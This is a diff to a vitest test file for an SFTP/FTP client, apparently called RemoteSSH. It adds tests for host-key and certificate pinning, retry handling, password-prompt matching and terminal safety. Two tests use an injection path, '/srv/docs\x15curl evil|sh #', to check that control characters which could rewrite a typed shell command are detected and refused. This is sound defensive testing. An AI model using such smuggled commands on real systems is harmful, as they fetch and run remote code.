@@ -1,18 +1,23 @@
 import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
+import { EventEmitter } from 'node:events'
 import { describe, expect, it } from 'vitest'
 import { parseListDate } from '../src/main/engine/ftpSession'
 import { localChild, opensAsProgram } from '../src/main/engine/localFS'
-import { CancelledError, type RemoteSession } from '../src/main/engine/session'
+import { CancelledError, isPermanentError, PermanentError, SessionError, type RemoteSession } from '../src/main/engine/session'
+import { isPasswordPrompt, type SFTPSession } from '../src/main/engine/sftpSession'
+import { CertificateStore } from '../src/main/store/certificates'
 import { fingerprint, KnownHostsStore } from '../src/main/store/knownHosts'
 import { ArchiveError, decodeArchive, encodeArchive } from '../src/main/store/siteArchive'
 import { QueueStore, SettingsStore } from '../src/main/store/settingsStore'
 import { SiteStore, type SecretCipher } from '../src/main/store/siteStore'
-import { TransferManager, uniqueLocalName } from '../src/main/transfers'
+import { TLSHostsStore } from '../src/main/store/tlsHosts'
+import { Terminals } from '../src/main/terminal'
+import { isPlainName, TransferManager, uniqueLocalName } from '../src/main/transfers'
 import { displayAddress, effectivePort, makeSite, normalizeSite, parseQuickConnect } from '../src/shared/site'
-import { defaultSettings, type FileEntry, type PromptRequest, type Site, type TransferItem } from '../src/shared/types'
-import { compareVersions, Permissions, RemotePath, shellQuote } from '../src/shared/util'
+import { defaultSettings, type AppSettings, type FileEntry, type PromptRequest, type Site, type TransferItem } from '../src/shared/types'
+import { compareVersions, hasControlChars, Permissions, RemotePath, shellQuote } from '../src/shared/util'
 
 const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'remotessh-test-'))
 
@@ -144,7 +149,10 @@ describe('stores', () => {
     const reloaded = new KnownHostsStore(dir)
     expect(reloaded.check('example.com', 22, 'ssh-ed25519 AAA')).toBe('trusted')
     expect(reloaded.check('example.com', 22, 'ssh-ed25519 BBB')).toBe('changed')
-    expect(fingerprint(Buffer.from('abc'))).toMatch(/^SHA256:[A-Za-z0-9+/]{43}$/)
+    expect(reloaded.check('example.com', 2222, 'ssh-ed25519 AAA')).toBe('unknown') // ports are kept apart
+    // The same value `ssh-keygen -lf` prints for this public key.
+    const blob = Buffer.from('AAAAC3NzaC1lZDI1NTE5AAAAIPUbS24Qa1ge84W6FhPjOR3LpXZfNmS6iDXnK3uZ7j2s', 'base64')
+    expect(fingerprint(blob)).toBe('SHA256:2TXDMHQhye2muUSbjICrbegLLW0EHBcZ/2tPmOpCoN8')
   })
   it('restores interrupted transfers as queued and drops finished ones', () => {
     const dir = tmp()
@@ -241,16 +249,25 @@ describe('TransferManager', () => {
     return { session, release: () => release() }
   }
 
-  function setup(opts: { connect?: (site: Site) => Promise<RemoteSession>; answers?: unknown[] } = {}) {
-    const dir = tmp()
+  function setup(
+    opts: {
+      connect?: (site: Site) => Promise<RemoteSession>
+      answers?: unknown[]
+      settings?: Partial<AppSettings>
+      list?: (path: string) => Promise<FileEntry[]>
+      dir?: string
+    } = {},
+  ) {
+    const dir = opts.dir ?? tmp()
     const site = makeSite({ host: 'h' })
     const fake = fakeSession(site)
+    if (opts.list) Object.assign(fake.session, { list: opts.list })
     const errors: string[] = []
     const prompts: PromptRequest[] = []
     let connects = 0
     const manager = new TransferManager(
       {
-        settings: () => ({ ...defaultSettings, maxConcurrentTransfers: 1 }),
+        settings: () => ({ ...defaultSettings, maxConcurrentTransfers: 1, ...opts.settings }),
         site: () => site,
         connectSession: async (s) => {
           connects++
@@ -338,5 +355,169 @@ describe('TransferManager', () => {
     await t.manager.enqueueDownload([entry('b.txt')], '/', t.dir, t.site)
     await settle()
     expect(t.prompts).toHaveLength(2) // a later batch is asked again
+  })
+
+  it('does not follow links to folders in a remote folder download', async () => {
+    const dirEntry = (name: string, isLink = false): FileEntry => ({ ...entry(name), isDirectory: true, isLink, size: null })
+    const listed: string[] = []
+    const t = setup({
+      list: async (p) => {
+        listed.push(p)
+        return p === '/top' ? [dirEntry('loop', true), entry('a.txt')] : []
+      },
+    })
+    await t.manager.enqueueDownload([dirEntry('top')], '/', t.dir, t.site)
+    expect(listed).toEqual(['/top'])
+    expect(t.manager.all().map((i) => i.remotePath)).toEqual(['/top/a.txt'])
+  })
+
+  it('does not retry errors a retry cannot fix', async () => {
+    const t = setup({ connect: async () => Promise.reject(new PermanentError('530 Login incorrect.')) })
+    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
+    await settle()
+    expect(t.connects()).toBe(1)
+    expect(t.manager.all()[0]).toMatchObject({ status: 'failed', error: '530 Login incorrect.' })
+  })
+
+  it('waits before retrying a connection failure', async () => {
+    const t = setup({ connect: async () => Promise.reject(new SessionError('ECONNRESET')), settings: { retryCount: 2 } })
+    await t.manager.enqueueDownload([entry('a.txt')], '/', t.dir, t.site)
+    await settle()
+    expect(t.connects()).toBe(1) // the retry waits about a second instead of reconnecting at once
+    expect(t.manager.all()[0].status).toBe('queued')
+    t.manager.stopAll()
+  })
+
+  it('"apply to all" also answers questions already waiting from other workers', async () => {
+    const t = setup({ answers: [{ action: 'skip', applyToAll: true }], settings: { maxConcurrentTransfers: 2 } })
+    fs.writeFileSync(path.join(t.dir, 'a.txt'), 'old')
+    fs.writeFileSync(path.join(t.dir, 'b.txt'), 'old')
+    await t.manager.enqueueDownload([entry('a.txt'), entry('b.txt')], '/', t.dir, t.site)
+    await settle()
+    expect(t.prompts).toHaveLength(1)
+    expect(t.manager.all().map((i) => [i.status, i.error])).toEqual([
+      ['finished', 'Skipped'],
+      ['finished', 'Skipped'],
+    ])
+  })
+
+  it('restores unfinished transfers as failed, ready to retry', () => {
+    const dir = tmp()
+    new QueueStore(dir).save([
+      { id: 'A', siteID: 'S', direction: 'download', localPath: '/l', remotePath: '/r', size: 1, status: 'queued', transferred: 0 },
+    ])
+    const t = setup({ dir })
+    expect(t.manager.processing).toBe(true)
+    expect(t.manager.all()[0]).toMatchObject({ status: 'failed', error: 'Interrupted when RemoteSSH quit' })
+  })
+})
+
+describe('review fixes', () => {
+  it('spots control characters that could rewrite a typed shell command', () => {
+    expect(hasControlChars('/var/www/site')).toBe(false)
+    expect(hasControlChars("/srv/it's ü")).toBe(false)
+    expect(hasControlChars('/srv/docs\x15curl evil|sh #')).toBe(true)
+    expect(hasControlChars('/srv/a\x03')).toBe(true)
+    expect(hasControlChars('/srv/a\x7f')).toBe(true)
+    expect(hasControlChars('/srv/a\u009b')).toBe(true)
+    expect(hasControlChars('/srv/a\nb')).toBe(true)
+  })
+
+  it('accepts only plain names as rename answers', () => {
+    expect(isPlainName('report.txt')).toBe(true)
+    for (const bad of ['', '.', '..', '../x', 'a/b', 'a\\b', 'a\nb']) expect(isPlainName(bad)).toBe(false)
+  })
+
+  it('keeps folders openable in a recursive chmod', () => {
+    expect(Permissions.folderMode(0o644).toString(8)).toBe('755')
+    expect(Permissions.folderMode(0o600).toString(8)).toBe('700')
+    expect(Permissions.folderMode(0o640).toString(8)).toBe('750')
+    expect(Permissions.folderMode(0o000).toString(8)).toBe('0')
+  })
+
+  it('gives the saved password only to real password prompts', () => {
+    for (const p of ['Password:', 'password: ', "deploy@example.com's password:", 'Password']) expect(isPasswordPrompt(p)).toBe(true)
+    for (const p of ['One-time password:', 'Verification code (not your password):', 'OTP:', 'New password:']) expect(isPasswordPrompt(p)).toBe(false)
+  })
+
+  it('tells permanent errors from connection problems', () => {
+    expect(isPermanentError(new PermanentError('550'))).toBe(true)
+    expect(isPermanentError(Object.assign(new Error('denied'), { code: 'EACCES' }))).toBe(true)
+    expect(isPermanentError(Object.assign(new Error('Permission denied'), { code: 3 }))).toBe(true) // SFTP status
+    expect(isPermanentError(Object.assign(new Error('reset'), { code: 'ECONNRESET' }))).toBe(false)
+    expect(isPermanentError(new SessionError('Connection closed.'))).toBe(false)
+  })
+
+  it('validates enum values in sites and imports', () => {
+    const site = normalizeSite({ serverProtocol: 'gopher', encryption: 'none', logonType: 'root', port: -5 } as unknown as Partial<Site>)
+    expect(site).toMatchObject({ serverProtocol: 'sftp', encryption: 'explicitIfAvailable', logonType: 'normal', port: 0 })
+    const file = (fields: object) => JSON.stringify({ format: 'remotessh.sites', version: 1, sites: [{ ...makeSite({ name: 'Prod' }), ...fields }] })
+    expect(() => decodeArchive(file({ serverProtocol: 'SFTP' }))).toThrow(/Prod has an invalid serverProtocol/)
+    expect(() => decodeArchive(file({ encryption: 'requireimplicit' }))).toThrow(ArchiveError)
+    expect(decodeArchive(file({ trustInvalidCertificate: true })).sites[0].trustInvalidCertificate).toBe(false)
+  })
+
+  it('pins accepted certificates by fingerprint', () => {
+    const dir = tmp()
+    const certs = new CertificateStore(dir)
+    expect(certs.check('Host', 990, 'AA', true)).toBe('unknown')
+    certs.trust('host', 990, 'AA', false) // accept once: this run only
+    expect(certs.check('HOST', 990, 'AA', false)).toBe('trusted')
+    expect(certs.check('host', 990, 'BB', false)).toBe('changed')
+    expect(new CertificateStore(dir).check('host', 990, 'AA', true)).toBe('unknown')
+    certs.trust('host', 990, 'AA', true)
+    const reloaded = new CertificateStore(dir)
+    expect(reloaded.hasPin('host', 990)).toBe(true)
+    expect(reloaded.check('host', 990, 'AA', true)).toBe('trusted')
+    expect(reloaded.check('host', 990, 'BB', true)).toBe('changed')
+    expect(reloaded.check('host', 990, 'AA', false)).toBe('unknown') // the site's trust setting is off
+    expect(reloaded.check('host', 21, 'AA', true)).toBe('unknown')
+  })
+
+  it('remembers FTP servers that used TLS across restarts', () => {
+    const dir = tmp()
+    new TLSHostsStore(dir).add('FTP.example.com', 21)
+    const store = new TLSHostsStore(dir)
+    expect(store.has('ftp.example.com', 21)).toBe(true)
+    expect(store.has('ftp.example.com', 2121)).toBe(false)
+  })
+
+  it('refuses to type a folder with control characters into a new shell', async () => {
+    const written: string[] = []
+    const errors: string[] = []
+    const channel = Object.assign(new EventEmitter(), {
+      stderr: Object.assign(new EventEmitter(), { setEncoding: () => undefined }),
+      setEncoding: () => undefined,
+      write: (d: string) => written.push(d),
+      pause: () => undefined,
+      resume: () => undefined,
+    })
+    const session = { pwd: async () => '/home/u', shell: async () => channel, close: () => undefined } as unknown as SFTPSession
+    const terminals = new Terminals({ connect: async () => session, send: () => undefined, error: (t) => errors.push(t) })
+    await terminals.open(makeSite(), 80, 24, '/srv/docs\x15curl evil|sh #')
+    expect(written).toEqual([])
+    expect(errors[0]).toMatch(/control characters/)
+    await terminals.open(makeSite(), 80, 24, "/srv/it's")
+    expect(written).toEqual([` cd -- '/srv/it'\\''s' && clear\n`])
+  })
+
+  it('pauses the SSH channel while the terminal is behind', async () => {
+    const calls: string[] = []
+    const channel = Object.assign(new EventEmitter(), {
+      stderr: Object.assign(new EventEmitter(), { setEncoding: () => undefined }),
+      setEncoding: () => undefined,
+      write: () => true,
+      close: () => undefined,
+      pause: () => calls.push('pause'),
+      resume: () => calls.push('resume'),
+    })
+    const session = { pwd: async () => '/', shell: async () => channel, close: () => undefined } as unknown as SFTPSession
+    const terminals = new Terminals({ connect: async () => session, send: () => undefined, error: () => undefined })
+    const id = await terminals.open(makeSite(), 80, 24, null)
+    channel.emit('data', 'x'.repeat(1_200_000))
+    expect(calls).toEqual(['pause'])
+    terminals.ack(id, 1_100_000)
+    expect(calls).toEqual(['pause', 'resume'])
+    terminals.closeAll()
   })
 })
